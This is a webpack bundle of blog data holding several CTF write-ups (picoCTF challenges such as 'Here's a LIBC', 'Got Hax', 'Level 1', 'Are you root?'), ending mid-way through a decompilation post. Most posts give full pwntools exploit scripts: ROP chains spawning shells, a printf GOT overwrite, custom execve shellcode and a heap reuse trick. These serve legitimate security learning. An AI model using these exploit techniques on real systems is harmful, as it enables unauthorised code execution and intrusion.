"use strict";(self.webpackChunkchristopher_nguyen_re=self.webpackChunkchristopher_nguyen_re||[]).push([[1477],{10:e=>{e.exports=JSON.parse('{"blogPosts":[{"id":"heres_a_libc","metadata":{"permalink":"/blog/heres_a_libc","editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/blog/2022-12-27-heres-a-libc.md","source":"@site/blog/2022-12-27-heres-a-libc.md","title":"Here\'s a LIBC","description":"The Challenge","date":"2022-12-27T00:00:00.000Z","formattedDate":"December 27, 2022","tags":[{"label":"Pico CTF","permalink":"/blog/tags/pico-ctf"},{"label":"Binary Exploitation","permalink":"/blog/tags/binary-exploitation"}],"readingTime":2.12,"truncated":true,"authors":[{"name":"Christopher Nguyen","title":"Reverse Engineer","url":"https://github.com/christopher-nguyen-re","imageURL":"https://cdn.cnn.com/cnnnext/dam/assets/190517103414-01-grumpy-cat-file-restricted.jpg","key":"nguyen"}],"frontMatter":{"slug":"heres_a_libc","title":"Here\'s a LIBC","authors":["nguyen"],"tags":["Pico CTF","Binary Exploitation"]},"nextItem":{"title":"Guessing Game 1","permalink":"/blog/guessing_game_1"}},"content":"\x3c!--truncate--\x3e\\n\\n## The Challenge\\n\\nThe challenge can be found [here](https://play.picoctf.org/practice).\\n\\n## Analysis\\n\\nI always like to start off with running checksec on the binary of interest.\\n\\n```bash\\nchecksec ./vuln\\n```\\n\\nInsert image of checksec result here.\\n\\nWe won\'t be able to execute instructions on the stack so a ropchain may be necessary. PIE is not enabled so we will not need to worry about memory addresses changing every time we run the binary.\\n\\nUsing Ghidra, we find that there is a ```scanf``` vulnerability that can lead to a buffer overflow. We can use ```cyclic``` to determine the overflow offset which is 136.\\n\\n## The Solve\\n\\nThere is no flag within the binary so we will try to obtain a shell. If we leak a libc address, we can find the base address of the library and then utilize the system function to start a shell.\\n\\nTo get the binary to run locally, I used ```pwninit``` to automatically fetch a linker that can load the provided libc without segfaulting and patch the vuln binary.\\n\\nA common technique here is to use ```puts``` to leak the ```puts``` GOT. With the ```puts``` address, we can determine the address for system and craft a ropchain to run ```system(\\"bin/sh\\")```. Due to stack alignment, I needed an extra ```ret``` instruction.\\n\\nNow we have a shell and can see that there is a flag file that we can ```cat```.\\n\\n## Script\\n\\n```python\\nfrom pwn import *\\n\\nexe = ELF(\\"./vuln_patched\\")\\nlibc = ELF(\\"./libc.so.6\\")\\nld = ELF(\\"./ld-2.27.so\\")\\n\\ncontext.binary = exe\\ncontext.log_level = \'info\'\\ncontext.terminal = [\'gnome-terminal\', \'-e\']\\n\\ngdb_script = \\"\\"\\"\\n\\"\\"\\"\\n\\ndef conn():\\n    \'\'\'Establish the connection to the process, local or remote.\\n    \'\'\'\\n\\n    if args.get(\'REMOTE\'):\\n        io = remote(\'mercury.picoctf.net\', 24159)\\n    elif args.get(\'GDB\'):\\n        io = gdb.debug([exe.path], gdb_script)\\n    else:\\n        io = process([exe.path])\\n    return io\\n\\n\\ndef main():\\n    \'\'\'Return the flag.\\n    \'\'\'\\n    offset = 136\\n\\n    rop = ROP(exe)\\n    with conn() as io:\\n        pattern = b\\"A\\" * offset + p64(rop.find_gadget([\'pop rdi\', \'ret\'])[0]) + \\\\\\n                    p64(exe.got[\'puts\']) + p64(exe.plt[\'puts\']) + p64(exe.symbols[\'main\'])\\n        io.sendline(pattern)\\n        io.recvlines(2)\\n        # Get the puts output of the puts GOT address\\n        got_addr = io.recvline()\\n        # Strip newline\\n        got_addr = got_addr[:-1]\\n        \\n        # Pad for packing\\n        pad_len = 8 - len(got_addr)\\n        got_addr = got_addr + (b\\"\\\\x00\\" * pad_len)\\n\\n        print(f\\"GOT ADDR: {hex(u64(got_addr))}\\")\\n        base_addr = u64(got_addr) - 0x180a30\\n        print(f\\"Base addr: {hex(base_addr)}\\")\\n        system_addr = base_addr + 0x0014f4e0\\n        print(f\\"System addr: {hex(system_addr)}\\")\\n        bin_sh_addr = base_addr + 0x2b40fa\\n        \\n        # Note stack alignment issues so additional ret was required for 16 byte alignment\\n        payload = b\\"A\\" * offset + p64(rop.find_gadget([\'pop rdi\', \'ret\'])[0]) + \\\\\\n                    p64(bin_sh_addr) + p64(rop.find_gadget([\'ret\'])[0]) + \\\\\\n                    p64(system_addr)\\n        io.sendline(payload)\\n        io.interactive()\\n\\n\\nif __name__ == \'__main__\':\\n    main()\\n```"},{"id":"guessing_game_1","metadata":{"permalink":"/blog/guessing_game_1","editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/blog/2022-05-24-guessing-game-1.md","source":"@site/blog/2022-05-24-guessing-game-1.md","title":"Guessing Game 1","description":"Description:","date":"2022-05-24T00:00:00.000Z","formattedDate":"May 24, 2022","tags":[{"label":"Binary Exploitation","permalink":"/blog/tags/binary-exploitation"}],"readingTime":2.21,"truncated":true,"authors":[{"name":"Christopher Nguyen","title":"Reverse Engineer","url":"https://github.com/christopher-nguyen-re","imageURL":"https://cdn.cnn.com/cnnnext/dam/assets/190517103414-01-grumpy-cat-file-restricted.jpg","key":"nguyen"}],"frontMatter":{"slug":"guessing_game_1","title":"Guessing Game 1","authors":["nguyen"],"tags":["Binary Exploitation"]},"prevItem":{"title":"Here\'s a LIBC","permalink":"/blog/heres_a_libc"},"nextItem":{"title":"Function Overwrite","permalink":"/blog/function_overwrite"}},"content":"Description:\\n\\nI made a simple game to show off my programming skills. See if you can beat it!\\n\\n\x3c!--truncate--\x3e\\n\\n## The Challenge\\n\\nChallenge can be found [here](https://play.picoctf.org/practice/challenge/90?page=1&search=guess)\\n\\n## Analysis\\n\\nUsing ```checksec```, we find that the program has stack canary, partial relro, and NX enabled. The architecture is amd64 little endian.\\n\\n## The Solve\\n\\nUpon inspection of the source code, I saw that there is no call to ```srand()``` meaning that the value for ```rand()``` stays the same every time the program is run. We can extract the value using gdb and get ```0x53```. Incrementing this by 1 gives us the correct value ```84```. Entering this value to the program allows us to reach the ```win``` function.\\n\\n```win``` contains a buffer overflow when it calls ```fgets```. I could not find the challenge flag within the executable so I used ropper to find ROP gadgets and obtain a shell.\\n\\nConditions for obtaining a shell with execve:\\n\\n1. char \\\\* filepath set to /bin/sh in rdi\\n2. char \\\\* argv set to NULL in rsi\\n3. char \\\\* envp set to NULL in rdx\\n4. value 0x3b for syscall in rax\\n\\nAfter obtaining a shell, I was able to see that there was a flag file and ```cat``` it.\\n\\n## Script\\n\\n```python\\n\\"\\"\\"\\nToast\'s submission for picoGym challenge Guessing Game 1.\\n\\nThis script can be used in the following manner:\\npython3 ./solve.py <REMOTE/LOCAL>\\n\\nArgs:\\n    param1: LOCAL will operate locally on the user\'s machine.\\n            REMOTE will connect to the CTF webserver and grab the flag.\\n            If no parameter is specified, the program will default to LOCAL.\\n\\nReturns:\\n    The flag to solve the challenge.\\n\\"\\"\\"\\n\\nfrom pwn import *\\n\\nexe = ELF(\\"./vuln\\")\\n\\ncontext.binary = exe\\ncontext.log_level = \'info\'\\ncontext.terminal = [\'gnome-terminal\', \'-e\']\\n\\ndef conn():\\n    \'\'\'Establish the connection to the process, local or remote.\\n    \'\'\'\\n\\n    if args.get(\'REMOTE\'):\\n        io = remote(\'jupiter.challenges.picoctf.org\', 50581)\\n    elif args.get(\'GDB\'):\\n        io = gdb.debug([exe.path])\\n    else:\\n        io = process([exe.path])\\n\\n    return io\\n\\n\\ndef main():\\n    flag = get_flag()\\n    log.success(flag)\\n\\n\\ndef get_flag():\\n    \'\'\'Return the flag.\\n    \'\'\'\\n    with conn() as io:\\n        io.sendline(b\\"84\\")\\n        payload = b\\"A\\" * 120\\n\\n        # 0x6ba0e0 Address of Data section\\n        # 0x400696 pop rdi; ret;\\n        payload += p64(0x400696) + p64(0x6ba0e0)\\n\\n        # 0x410ca3 pop rsi; ret;\\n        payload += p64(0x410ca3) + b\\"/bin//sh\\"\\n\\n        # 0x447d7b mov qword ptr [rdi], rsi; ret;\\n        payload += p64(0x447d7b)\\n\\n        # 0x6ba0e8 address of DATA + 8\\n        # 0x410ca3 pop rsi; ret;\\n        payload += p64(0x410ca3) + p64(0x6ba0e8)\\n\\n        # 0x6ba0e8 address of DATA + 8\\n        # 0x44cc26 pop rdx; ret;\\n        payload += p64(0x44cc26) + p64(0x6ba0e8)\\n\\n        # 0x4163f4 pop rax; ret;\\n        payload += p64(0x4163f4) + p64(0x3b)\\n\\n        # 0x40137c syscall;\\n        payload += p64(0x40137c)\\n\\n        io.sendline(payload)\\n\\n        io.recvuntil(b\\"\\\\x06\\")\\n        io.recvuntil(b\\"@\\\\n\\\\n\\")\\n        io.sendline(b\\"cat flag.txt\\")\\n        flag = io.recvline()\\n        io.close()\\n        return flag.decode()\\n\\n\\nif __name__ == \'__main__\':\\n    main()\\n```"},{"id":"function_overwrite","metadata":{"permalink":"/blog/function_overwrite","editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/blog/2022-05-23-function-overwrite.md","source":"@site/blog/2022-05-23-function-overwrite.md","title":"Function Overwrite","description":"Function Overwrite","date":"2022-05-23T00:00:00.000Z","formattedDate":"May 23, 2022","tags":[{"label":"Binary Exploitation","permalink":"/blog/tags/binary-exploitation"}],"readingTime":2.135,"truncated":true,"authors":[{"name":"Christopher Nguyen","title":"Reverse Engineer","url":"https://github.com/christopher-nguyen-re","imageURL":"https://cdn.cnn.com/cnnnext/dam/assets/190517103414-01-grumpy-cat-file-restricted.jpg","key":"nguyen"}],"frontMatter":{"slug":"function_overwrite","title":"Function Overwrite","authors":["nguyen"],"tags":["Binary Exploitation"]},"prevItem":{"title":"Guessing Game 1","permalink":"/blog/guessing_game_1"},"nextItem":{"title":"Got Hax","permalink":"/blog/got_hax"}},"content":"Function Overwrite\\n\\nYou can point to all kinds of things in C.\\n\\nHint: Don\'t be so negative\\n\\n\x3c!--truncate--\x3e\\n\\n## The Challenge\\n\\nExecutable can be downloaded [here](/files/function_overwrite/vuln) (Right click and open in new tab).\\n\\nSource code [here](/files/function_overwrite/vuln.c)\\n\\nThe goal of this challenge is to get the flag.\\n\\n## Analysis\\n\\nThe source code was provided so I went ahead and took a look into it to determine insecure code. On line 82, there is an if statement that references an index of an array based on user input. We can use this to access memory outside the bounds of the array. The array is declared right below a function pointer that is set to `hard_checker`.\\n\\n## The Solve\\n\\nUsing GDB, I determined the offset from the array `fun` to the `check` function pointer.\\n\\n![Addresses](/img/function_overwrite/check_fun_addrs.png)\\n\\nThe offset is 0x40 so fun is 64 bytes, or 16 ints, away. In order to modify the value of check to be set to easy_checker, we need to determine the value for `num2` to add to the address of hard_checker.\\n\\n- Hard check = 0x8049436\\n- Easy check = 0x80492fc\\n\\n0x8049436 - 0x80492fc = 0x13A = 314 bytes\\n\\nWe can set `num1` to -16 and `num2` to -314.\\n\\nFor the last piece of the challenge, we need a string where the sum of the values of each character equals `1337`. We have a buffer of up to 127 characters. We can use the highest value character `~` to make as small a string as possible. \\n\\n\\"~\\" = 126\\n\\n1337 / 126 = 10.61111111111111\\n\\nWe can use 10 \\"~\\" which leaves us with 1337 - (10 * 126) = 77\\n\\n77 = \\"M\\"\\n\\nThe string `~~~~~~~~~~M` = 1337\\n\\n## Script\\n\\n```python\\n#!/usr/bin/env python3\\n\\n\\"\\"\\"\\nToast\'s submission for the picoGym challenge function overwrite.\\n\\nThis script can be used in the following manner:\\npython3 ./solve.py <REMOTE/LOCAL>\\n\\nArgs:\\n    param1: LOCAL will operate locally on the user\'s machine.\\n            REMOTE will connect to the CTF webserver and grab the flag.\\n            If no parameter is specified, the program will default to LOCAL.\\n\\nReturns:\\n    The flag to solve the challenge.\\n\\"\\"\\"\\n\\nfrom pwn import *\\n\\nexe = ELF(\\"./vuln\\")\\n\\ncontext.binary = exe\\ncontext.log_level = \'info\'\\ncontext.terminal = [\'gnome-terminal\', \'-e\']\\n\\ndef conn():\\n    \'\'\'Establish the connection to the process, local or remote.\\n    \'\'\'\\n\\n    if args.get(\'REMOTE\'):\\n        io = remote(\'addr\', 4141)\\n\\n    else:\\n        io = process([exe.path])\\n\\n    return io\\n\\n\\ndef main():\\n    \'\'\'Return the flag.\\n    \'\'\'\\n\\n    with conn() as io:\\n        flag = get_flag(io)\\n        log.success(f\\"Flag is: {flag}\\")\\n\\n\\ndef get_flag(io):\\n    scanf_to_check_offset = -16\\n    fun_to_check_offset = -314\\n    io.sendline(b\'~~~~~~~~~~M\')\\n    io.recvline()\\n    io.sendline(b\'-16 -314\')\\n    io.recvline()\\n    flag = io.recvline()\\n    return flag.decode()\\n\\n\\nif __name__ == \'__main__\':\\n    main()\\n```"},{"id":"got_hax","metadata":{"permalink":"/blog/got_hax","editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/blog/2022-05-03-got_hax.md","source":"@site/blog/2022-05-03-got_hax.md","title":"Got Hax","description":"Got Hax","date":"2022-05-03T00:00:00.000Z","formattedDate":"May 3, 2022","tags":[{"label":"Binary Exploitation","permalink":"/blog/tags/binary-exploitation"}],"readingTime":1.425,"truncated":true,"authors":[{"name":"Christopher Nguyen","title":"Reverse Engineer","url":"https://github.com/christopher-nguyen-re","imageURL":"https://cdn.cnn.com/cnnnext/dam/assets/190517103414-01-grumpy-cat-file-restricted.jpg","key":"nguyen"}],"frontMatter":{"slug":"got_hax","title":"Got Hax","authors":["nguyen"],"tags":["Binary Exploitation"]},"prevItem":{"title":"Function Overwrite","permalink":"/blog/function_overwrite"},"nextItem":{"title":"Level 1","permalink":"/blog/level-1"}},"content":"Got Hax\\n\\n\x3c!--truncate--\x3e\\n\\n## The Challenge\\n\\nFile can be downloaded [here](/files/got_hax/got_hax) (Right click and open in new tab).\\n\\nThe goal of this challenge is to get the flag.\\n\\n## Analysis\\n\\nI opened the executable in ghidra and found the function `get_your_flag`. It reads a key file and prints the flag.\\n\\nIn `main`, there is a printf vulnerability. A printf call is made using a user provided argument on the command line. If we can overwrite the GOT address for `puts` to be the address for `get_your_flag`, then we will be able to obtain the flag.\\n\\nI ran the executable and sent several `%p`s as input for printf. I was able to view addresses on the stack and determined that the 6th value was the one that could be overwritten because it is the ASCII value for %p. We are writing this value to the stack.\\n\\n![p output](/img/got_hax/initial_test.png)\\n\\n## The Solve\\n\\nI used pwntools to get the `puts` GOT address and replace it with `get_your_flag` using printf\'s %n vulnerability.\\n\\n```python\\n#!/usr/bin/env python3\\n\\n\\"\\"\\"\\nToast\'s submission for the challenge Got Hax.\\n\\nThis script can be used in the following manner:\\npython3 ./solve.py\\n\\nReturns:\\n    The flag to solve the challenge.\\n\\"\\"\\"\\n\\nfrom pwn import *\\n\\nexe = ELF(\\"./got_hax\\")\\n\\ncontext.binary = exe\\ncontext.log_level = \'info\'\\ncontext.terminal = [\'gnome-terminal\', \'-e\']\\n\\n# Overwrite puts GOT with flag_function\\nputs_plt = exe.got[\'puts\']\\nget_flag = exe.symbols[\'get_your_flag\']\\n\\ndef conn():\\n    \'\'\'Establish the connection to the process\\n    \'\'\'\\n\\n    exploit = p32(puts_plt)\\n    exploit += b\'%\' + str(get_flag - 0x4).encode() + b\'x%6$n\'\\n    io = process([exe.path, exploit])\\n    return io\\n\\n\\ndef main():\\n    \'\'\'Return the flag.\\n    \'\'\'\\n\\n    with conn() as io:\\n        io.sendline(b\'1\')\\n        io.recvuntil(b\'You GOT hax! Your flag is \')\\n        flag = io.recv()\\n        print(f\\"Flag is : {flag}\\")\\n\\n\\nif __name__ == \'__main__\':\\n    main()\\n```"},{"id":"level-1","metadata":{"permalink":"/blog/level-1","editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/blog/2022-05-01-level-1.md","source":"@site/blog/2022-05-01-level-1.md","title":"Level 1","description":"Level 1","date":"2022-05-01T00:00:00.000Z","formattedDate":"May 1, 2022","tags":[{"label":"Binary Exploitation","permalink":"/blog/tags/binary-exploitation"}],"readingTime":2.955,"truncated":true,"authors":[{"name":"Christopher Nguyen","title":"Reverse Engineer","url":"https://github.com/christopher-nguyen-re","imageURL":"https://cdn.cnn.com/cnnnext/dam/assets/190517103414-01-grumpy-cat-file-restricted.jpg","key":"nguyen"}],"frontMatter":{"slug":"level-1","title":"Level 1","authors":["nguyen"],"tags":["Binary Exploitation"]},"prevItem":{"title":"Got Hax","permalink":"/blog/got_hax"},"nextItem":{"title":"Are you root?","permalink":"/blog/are-you-root"}},"content":"Level 1\\n\\n\x3c!--truncate--\x3e\\n\\n## The Challenge\\n\\nFile can be downloaded [here](/files/level_1/level-1) (Right click and open in new tab).\\n\\nThe goal of this challenge is to provide shellcode that gets executed for a shell.\\n\\n## Analysis\\n\\nI ran the executable and sent random output just to see what would happen. When I sent \'h\', I received an output `Illegal instruction (core dumped)`. Since it interpreted \'h\' as an instruction, I could try to feed it an input that would be a valid instruction.\\n\\nUsing ghidra, I looked in main and found that the executable reads into a buffer of 4096 bytes and then executes it directly in memory. The value `0x48` is treated as a bad byte so I had to create shellcode that would avoid `0x48` and null bytes.\\n\\n`0x48` is a REX prefix that generally appears in shellcode where certain operations performed on 64 bit registers are used. I used the shellcode from pwntools as a template to start with.\\n\\n## The Solve\\n\\n```python3\\nshellcode = asm(shellcraft.amd64.linux.sh())\\n```\\n\\nThe above code provides the following shellcode:\\n\\n```asm\\n/* execve(path=\'/bin///sh\', argv=[\'sh\'], envp=0) */\\n/* push b\'/bin///sh\\\\x00\' */\\npush 0x68\\nmov rax, 0x732f2f2f6e69622f\\npush rax\\nmov rdi, rsp\\n/* push argument array [\'sh\\\\x00\'] */\\n/* push b\'sh\\\\x00\' */\\npush 0x1010101 ^ 0x6873\\nxor dword ptr [rsp], 0x1010101\\nxor esi, esi /* 0 */\\npush rsi /* null terminate */\\npush 8\\npop rsi\\nadd rsi, rsp\\npush rsi /* \'sh\\\\x00\' */\\nmov rsi, rsp\\nxor edx, edx /* 0 */\\n/* call execve() */\\npush SYS_execve /* 0x3b */\\npop rax\\nsyscall\\n```\\n\\nThrowing it into an assembler reveals that there are a few `0x48` bytes that need to be replaced.\\n\\n```asm\\n0:  6a 68                   push   0x68\\n2:  48 b8 2f 62 69 6e 2f    movabs rax,0x732f2f2f6e69622f\\n9:  2f 2f 73\\nc:  50                      push   rax\\nd:  48 89 e7                mov    rdi,rsp\\n10: 68 72 69 01 01          push   0x1016972\\n15: 81 34 24 01 01 01 01    xor    DWORD PTR [rsp],0x1010101\\n1c: 31 f6                   xor    esi,esi\\n1e: 56                      push   rsi\\n1f: 6a 08                   push   0x8\\n21: 5e                      pop    rsi\\n22: 48 01 e6                add    rsi,rsp\\n25: 56                      push   rsi\\n26: 48 89 e6                mov    rsi,rsp\\n29: 31 d2                   xor    edx,edx\\n2b: ff 34 25 00 00 00 00    push   QWORD PTR ds:0x0\\n32: 58                      pop    rax\\n33: 0f 05                   syscall\\n```\\n\\nI replaced mov operations with pushes and pops in order to get rid of the bad bytes. I also replaced line 2b with `push 0x3b` for the syscall code for execve.\\n\\n```asm\\npush 0x68\\nmov r15, 0x732f2f2f6e69622f\\npush r15\\npush rsp\\npop rdi\\n\\npush 0x1010101 ^ 0x6873\\nxor dword ptr [rsp], 0x1010101\\nxor esi, esi\\npush rsi\\npush 8\\npop r14\\nadd r14, rsp\\npush r14\\npush rsp\\npop rsi\\nxor edx, edx\\npush 0x3b\\npop rax\\nsyscall\\n```\\n\\nNow there are no more bad bytes.\\n\\n`\\"\\\\x6A\\\\x68\\\\x49\\\\xBF\\\\x2F\\\\x62\\\\x69\\\\x6E\\\\x2F\\\\x2F\\\\x2F\\\\x73\\\\x41\\\\x57\\\\x54\\\\x5F\\\\x68\\\\x72\\\\x69\\\\x01\\\\x01\\\\x81\\\\x34\\\\x24\\\\x01\\\\x01\\\\x01\\\\x01\\\\x31\\\\xF6\\\\x56\\\\x6A\\\\x08\\\\x41\\\\x5E\\\\x49\\\\x01\\\\xE6\\\\x41\\\\x56\\\\x54\\\\x5E\\\\x31\\\\xD2\\\\x6A\\\\x3B\\\\x58\\\\x0F\\\\x05\\"`\\n\\nI use pwntools to send the payload to the program and successfully obtain a shell.\\n\\n```python\\n#!/usr/bin/env python3\\n\\n\\"\\"\\"\\nToast\'s submission for the challenge level-1.\\n\\nThis script can be used in the following manner:\\npython3 ./solve.py\\n\\nReturns:\\n    An interactive shell\\n\\"\\"\\"\\n\\nfrom pwn import *\\n\\nexe = ELF(\\"./level-1\\")\\n\\ncontext.binary = exe\\ncontext.log_level = \'info\'\\ncontext.terminal = [\'gnome-terminal\', \'-e\']\\ncontext.arch = \'amd64\'\\n\\ndef conn():\\n    \'\'\'Establish the connection to the process, local or remote.\\n    \'\'\'\\n\\n    io = process([exe.path])\\n    return io\\n\\n\\ndef main():\\n    \'\'\'Return the flag.\\n    \'\'\'\\n\\n    with conn() as io:\\n        shellcode = b\\"\\\\x6A\\\\x68\\\\x49\\\\xBF\\\\x2F\\\\x62\\\\x69\\\\x6E\\\\x2F\\\\x2F\\\\x2F\\\\x73\\" + \\\\\\n                    b\\"\\\\x41\\\\x57\\\\x54\\\\x5F\\\\x68\\\\x72\\\\x69\\\\x01\\\\x01\\\\x81\\\\x34\\\\x24\\" + \\\\\\n                    b\\"\\\\x01\\\\x01\\\\x01\\\\x01\\\\x31\\\\xF6\\\\x56\\\\x6A\\\\x08\\\\x41\\\\x5E\\\\x49\\" + \\\\\\n                    b\\"\\\\x01\\\\xE6\\\\x41\\\\x56\\\\x54\\\\x5E\\\\x31\\\\xD2\\\\x6A\\\\x3B\\\\x58\\\\x0F\\\\x05\\"\\n        io.send(shellcode)\\n        io.interactive()\\n\\n\\nif __name__ == \'__main__\':\\n    main()\\n```\\n\\n![Shell output](/img/level_1/shell.png)\\n\\n## References\\n\\n[https://defuse.ca/online-x86-assembler.htm#disassembly](https://defuse.ca/online-x86-assembler.htm#disassembly)\\n\\n[https://staffwww.fullcoll.edu/aclifton/cs241/lecture-instruction-format.html](https://staffwww.fullcoll.edu/aclifton/cs241/lecture-instruction-format.html)\\n\\n[https://wiki.osdev.org/X86-64_Instruction_Encoding#REX_prefix](https://wiki.osdev.org/X86-64_Instruction_Encoding#REX_prefix)"},{"id":"are-you-root","metadata":{"permalink":"/blog/are-you-root","editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/blog/2022-03-01-are-you-root.md","source":"@site/blog/2022-03-01-are-you-root.md","title":"Are you root?","description":"2018 PicoCTF: Are you root?","date":"2022-03-01T00:00:00.000Z","formattedDate":"March 1, 2022","tags":[{"label":"PicoCTF 2018","permalink":"/blog/tags/pico-ctf-2018"},{"label":"Binary Exploitation","permalink":"/blog/tags/binary-exploitation"},{"label":"Heap grooming","permalink":"/blog/tags/heap-grooming"}],"readingTime":3.57,"truncated":true,"authors":[{"name":"Christopher Nguyen","title":"Reverse Engineer","url":"https://github.com/christopher-nguyen-re","imageURL":"https://cdn.cnn.com/cnnnext/dam/assets/190517103414-01-grumpy-cat-file-restricted.jpg","key":"nguyen"}],"frontMatter":{"slug":"are-you-root","title":"Are you root?","authors":["nguyen"],"tags":["PicoCTF 2018","Binary Exploitation","Heap grooming"]},"prevItem":{"title":"Level 1","permalink":"/blog/level-1"},"nextItem":{"title":"baby-c","permalink":"/blog/baby-c"}},"content":"2018 PicoCTF: Are you root?\\n\\n\x3c!--truncate--\x3e\\n\\n## The Challenge\\n\\nThe provided executable [here](/files/are_you_root/auth)\\n\\nThe goal is to obtain the flag.\\n\\n## Analysis\\n\\nRunning the program on a terminal gives us an interface we can login as a user. We are given the option to set the authorization level below 5. In order to get the flag, we must be able to set the authorization to level 5.\\n\\nAfter looking through the source file, we can see that allocated memory is not initalized for the `user` struct member `level`. `user->name` is free\'d upon receiving the `reset` command but the `user` struct itself is not freed.\\n\\nWe can use gdb with the gef extension to look more closely into the heap memory as we run the program. I have a breakpoint set at `putchar` as it is right before `fgets` is called for user input. I run `heap chunks` and `heap bins` to look at the current status of the heap.\\n\\n![Initial heap and bin](/img/are_you_root/initial_heap.png)\\n\\nAs expected, there is no memory allocated on the heap or stored in bins yet.\\n\\nI enter `login aaaaaaaaaaaaaaaaaaaa` to login as a user named containg 20 \'A\'s and look at `heap chunks` and `heap bins`.\\n\\n![Heap and bin after first login](/img/are_you_root/login_heap.png)\\n\\nViewing the chunks shows the stdin buffer containing the input string. Under it is a chunk that contains a pointer to the chunk below it. This makes me think that it is the user struct containing the pointer to the user name. The chunk with user name contains the \'a\'s as expected.\\n\\nI enter `reset` to free user name and look at the updated `heap chunks` and `heap bins`.\\n\\n![Heap and bin after reset](/img/are_you_root/reset.png)\\n\\nWhen free is called on `user->name`, the chunk containing the name string is stored in tcache.\\n\\nIf we log in again and look at the heap chunks, we can see that the free\'d memory still contains a part of the username provided previously. The first 8 bytes are zero\'d out but the rest remain the same. I enter `login b` and view the updated heap and bins.\\n\\n![Logging in after reset](/img/are_you_root/second_login.png)\\n\\nThe chunk at 0x603260 is the stdin buffer as it contains `reset` and \'a\'s. The \'a\'s are still there because stdin is not flushed and a null terminator separates the strings. The user struct is still in the chunks since it was not freed. Tcache is now empty because the chunk is being reused by the new user struct.\\n\\nEntering `show` then gives us the output below:\\n\\n![show on second login](/img/are_you_root/show.png)\\n\\nThe authorization level is actually the decimal conversion of 4 \'a\'s. These \'a\'s are the ones that had remained on the heap after `user->name` had been free\'d from the `reset` command.\\n\\nWe can manipulate the heap in a way so that the value `5` will be stored in the new user\'s level from running `login`. I will have the first 8 bytes set as \'a\'s and the following byte to be 0x05.\\n\\n```python\\n#!/usr/bin/env python3\\n\\n\\"\\"\\"\\nToast\'s submission for the challenge \'Are you Root\'.\\n\\nThis script can be used in the following manner:\\npython3 ./solve.py\\n\\nReturns:\\n    The flag to solve the challenge.\\n\\"\\"\\"\\n\\nfrom pwn import *\\n\\nexe = ELF(\\"./auth\\")\\nlibc = ELF(\\"./libc.so.6\\")\\nld = ELF(\\"./ld-2.27.so\\")\\n\\ncontext.binary = exe\\ncontext.log_level = \'info\'\\ncontext.terminal = [\'gnome-terminal\', \'-e\']\\n\\ndef conn():\\n    \'\'\'Establish the connection to the process, local or remote.\\n    \'\'\'\\n\\n    io = process([exe.path])\\n    return io\\n\\n\\ndef main():\\n    \'\'\'Return the flag.\\n    \'\'\'\\n    return get_flag()\\n\\n\\ndef get_flag():\\n    \'\'\'Get the flag\'\'\'\\n    with conn() as io:\\n        payload = str.encode(\\"login aaaaaaaa\\") + b\'\\\\x05\'\\n        io.sendlineafter(b\\"> \\", payload)\\n        io.sendlineafter(b\\"> \\", b\\"reset\\")\\n        io.sendlineafter(b\\"> \\", b\\"login bob\\")\\n        io.sendlineafter(b\\"> \\", b\\"get-flag\\")\\n        flag = str(io.recvline())\\n        io.success(\\"Flag found: \\" + flag)\\n        return flag\\n\\n\\nif __name__ == \'__main__\':\\n    main()\\n```\\n\\nThis attack is successful because of how the glibc heap management works. Data that is freed will be stored in tcache if it meets size requirements and has space to store chunks. Tcache is the first place that is checked for memory allocation or placing free\'d chunks. Tcache is meant to speed up performance because it is thread specific and does not require the bin to be locked for modification. If the program called a function pointer instead of checking an integer value, I would be able to call the `give_flag()` function directly.\\n\\n## References\\n\\n[Sourceware glibc Wiki](https://sourceware.org/glibc/wiki/MallocInternals)"},{"id":"baby-c","metadata":{"permalink":"/blog/baby-c","editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/blog/2022-02-15-baby-c.md","source":"@site/blog/2022-02-15-baby-c.md","title":"baby-c","description":"Decompetition.io: baby-c","date":"2022-02-15T00:00:00.000Z","formattedDate":"February 15, 2022","tags":[{"label":"CTF","permalink":"/blog/tags/ctf"},{"label":"Binary Exploitation","permalink":"/blog/tags/binary-exploitation"},{"label":"decompetition","permalink":"/blog/tags/decompetition"}],"readingTime":4.76,"truncated":true,"authors":[{"name":"Christopher Nguyen","title":"Reverse Engineer","url":"https://github.com/christopher-nguyen-re","imageURL":"https://cdn.cnn.com/cnnnext/dam/assets/190517103414-01-grumpy-cat-file-restricted.jpg","key":"nguyen"}],"frontMatter":{"slug":"baby-c","title":"baby-c","authors":["nguyen"],"tags":["CTF","Binary Exploitation","decompetition"]},"prevItem":{"title":"Are you root?","permalink":"/blog/are-you-root"},"nextItem":{"title":"Stonks","permalink":"/blog/stonks"}},"content":"Decompetition.io: baby-c\\n\\n\x3c!--truncate--\x3e\\n\\n## The Challenge\\n\\nThis challenge can be found [here](https://decompetition.io/challenges).\\n\\nThe provided executable [here](/files/baby-c/baby-c)\\n\\nThe goal of this challenge is to recreate the baby-c source file so that when it is decompiled, the assembly matches the provided target.\\n\\n## Analysis\\n\\nFirst, I looked at the provided assembly and attempted to figure out the program\'s general behavior. The challenge tells us that Intel syntax is used.\\n\\n### Full assembly\\n\\n```assembly\\nmain:\\n  endbr64\\n  push    rbp\\n  mov     rbp, rsp\\n  push    rbx\\n  sub     rsp, 0x18\\n  mov     [rbp-0x15], 1\\nblock1:\\n  mov     rax, [stdin]\\n  mov     rdi, rax\\n  call    getc@plt.sec\\n  mov     [rbp-0x14], eax\\n  cmp     [rbp-0x14], -1\\n  je      block7\\nblock2:\\n  call    __ctype_b_loc@plt.sec\\n  mov     rax, [rax]\\n  mov     edx, [rbp-0x14]\\n  movsxd  rdx, edx\\n  add     rdx, rdx\\n  add     rax, rdx\\n  movzx   eax, [rax]\\n  movzx   eax, ax\\n  and     eax, 0x2000\\n  test    eax, eax\\n  je      block4\\nblock3:\\n  mov     rdx, [stdout]\\n  mov     eax, [rbp-0x14]\\n  mov     rsi, rdx\\n  mov     edi, eax\\n  call    putc@plt.sec\\n  mov     [rbp-0x15], 1\\n  jmp     block1\\nblock4:\\n  cmp     [rbp-0x15], 0\\n  je      block6\\nblock5:\\n  mov     rbx, [stdout]\\n  